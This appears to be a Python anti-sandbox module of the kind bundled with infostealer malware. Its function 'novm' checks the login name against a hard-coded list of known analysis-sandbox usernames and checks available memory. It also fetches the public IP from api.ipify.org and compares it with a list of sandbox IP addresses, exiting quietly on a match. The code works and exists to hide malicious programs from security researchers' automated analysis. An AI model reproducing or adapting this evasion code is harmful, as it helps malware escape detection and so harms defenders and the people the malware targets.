import sys
import psutil
import requests
import os
import socket

def novm():
    blockedusers = [
        "05h00Gi0", "05KvAUQKPQ", "21zLucUnfI85", "3u2v9m8", "43By4",
        "4tgiizsLimS", "5sIBK", "5Y3y73", "grepete", "64F2tKIqO5",
        "6O4KyHhJXBiR", "7DBgdxu", "7wjlGX7PjlW4", "8LnfAai9QdJR", "8Nl0ColNQ5bq",
        "8VizSM", "9yjCPsEYIMH", "Abby", "acox", "admin", "Administrator",
        "Amy", "andrea", "AppOnFlySupport", "ASPNET", "azure", "mainuser",
        "barbarray", "benjah", "Bruno", "BUiA1hkm", "BvJChRPnsxn",
        "BXw7q", "cather", "cM0uEGN4do", "cMkNdS6", "DdQrgc",
        "DefaultAccount", "doroth", "dOuyo8RV71", "DVrzi", "dxd8DJ7c",
        "e60UW", "ecVtZ5wE", "EGG0p", "equZE3J", "fNBDSlDTXY",
        "Frank", "fred", "G2DbYLDgzz8Y", "george", "GexwjQdjXG",
        "GGw8NR", "GJAm1NxXVm", "GjBsjb", "gL50ksOp", "gu17B",
        "Guest", "h7dk1xPr", "h86LHD", "HAPUBWS", "Harry Johnson",
        "hbyLdJtcKyN1", "HEUeRzl", "hmarc", "ICQja5iT", "IVwoKUF",
        "IZZuXj", "j6SHA37KA", "j7pNjWM", "JAW4Dz0", "JcOtj17dZx",
        "jeremdiaz", "John", "John Doe", "jude", "Julia",
        "katorres", "kEecfMwgj", "kevans", "kFu0lQwgX5P", "KUv3bT4",
        "l3cnbB8Ar5b8", "Lisa", "lK3zMR", "lmVwjj9b", "Louise",
        "lubi53aN14cU", "Lucas", "Marci", "mike", "Mr.None",
        "noK4zG7ZhOf", "nZAp7UBVaS1", "o6jdigq", "o8yTi52T", "Of20XqH4VL",
        "OgJb6GqgK0O", "OZFUCOD6", "patex", "PateX", "Paul Jones",
        "pf5vj", "PgfV1X", "PqONjHVwexsS", "pWOuqdTDQ", "PxmdUOpVyx",
        "QfofoG", "QmIS5df7u", "QORxJKNk", "qZo9A", "rB5BnfuR2",
        "RDhJ0CNFevzX", "rexburns", "RGzcBUyrznReg", "Rt1r7", "ryjIJKIrOMs",
        "S7Wjuf", "sal.rosenburg", "server", "SqgFOf3G", "Steve",
        "test", "tHiF2T", "tim", "timcoo", "TVM",
        "txWas1m2t", "tylerfl", "uHUQIuwoEFU", "UiQcX", "umehunt",
        "umyUJ", "Uox1tzaMO", "User01", "UspG1y1C", "vzY4jmH0Jw02",
        "w0fjuOVmCcP5A", "WDAGUtilityAccount", "XMiMmcKziitD", "xPLyvzr8sgC", "xUnUy",
        "ykj0egq7fze", "ymONofg", "YmtRdbA", "zOEsT"
    ]
    blockedips = [
        "10.200.169.204", "181.215.176.83", "104.198.155.173", "104.200.151.35", "109.145.173.169", "109.226.37.172",
        "109.74.154.90", "109.74.154.91", "109.74.154.92", "140.228.21.36", "149.88.111.79",
        "154.61.71.50", "154.61.71.51", "172.105.89.202", "174.7.32.199", "176.63.4.179",
        "178.239.165.70", "181.214.153.11", "185.220.101.107", "185.44.176.125", "185.44.176.135",
        "185.44.176.143", "185.44.176.70", "185.44.176.85", "185.44.177.132", "185.44.177.133",
        "185.44.177.138", "185.44.177.193", "185.44.177.254", "185.44.177.55", "188.105.165.80",
        "188.105.71.44", "188.105.91.116", "188.105.91.143", "188.105.91.173", "191.101.209.39",
        "191.96.150.218", "192.211.110.74", "192.40.57.234", "192.87.28.103", "193.128.114.45",
        "193.225.193.201", "193.226.177.40", "194.110.13.70", "194.154.78.144", "194.154.78.152",
        "194.154.78.160", "194.154.78.169", "194.154.78.179", "194.154.78.210", "194.154.78.227",
        "194.154.78.230", "194.154.78.235", "194.154.78.77", "194.154.78.91", "194.186.142.178",
        "194.186.142.180", "194.186.142.183", "194.186.142.195", "194.186.142.204", "194.186.142.214",
        "194.186.142.236", "194.186.142.246", "195.181.175.103", "195.181.175.105", "195.228.105.39",
        "195.239.51.3", "195.239.51.42", "195.239.51.46", "195.239.51.59", "195.239.51.65",
        "195.239.51.73", "195.239.51.80", "195.239.51.89", "195.68.142.20", "195.68.142.3",
        "195.74.76.222", "2.94.86.134", "20.114.22.115", "20.99.160.173", "204.101.161.31",
        "204.101.161.32", "207.102.138.83", "207.102.138.93", "208.78.41.115", "209.127.189.74",
        "212.119.227.136", "212.119.227.151", "212.119.227.167", "212.119.227.179", "212.119.227.184",
        "212.41.6.23", "213.33.142.50", "213.33.190.109", "213.33.190.118", "213.33.190.171",
        "213.33.190.22", "213.33.190.227", "213.33.190.242", "213.33.190.35", "213.33.190.42",
        "213.33.190.46", "213.33.190.69", "213.33.190.74", "23.128.248.46", "34.105.0.27",
        "34.105.183.68", "34.105.72.241", "34.138.255.104", "34.138.96.23", "34.141.146.114",
        "34.141.245.25", "34.142.74.220", "34.145.195.58", "34.145.89.174", "35.233.234.155"
    ]
    username = os.getlogin()
    api_ip = requests.get('https://api.ipify.org').text
    if api_ip in blockedips or (any(username.lower() in user.lower() for user in blockedusers) and psutil.virtual_memory().available < 10 * 1024**3):
        sys.exit()
    else:
        pass